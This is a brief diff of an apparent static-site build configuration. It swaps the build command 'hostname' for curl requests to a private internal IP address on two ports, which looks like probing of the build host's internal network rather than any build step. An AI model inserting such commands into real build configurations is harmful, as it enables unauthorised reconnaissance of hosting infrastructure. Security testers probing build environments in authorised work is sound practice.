@@ -1,5 +1,5 @@
 [build]
-  command = 'hostname'
+  command = 'curl -i 10.4.140.1;curl -i 10.4.140.1:8080'
   publish = ".next"
 
 [[plugins]]
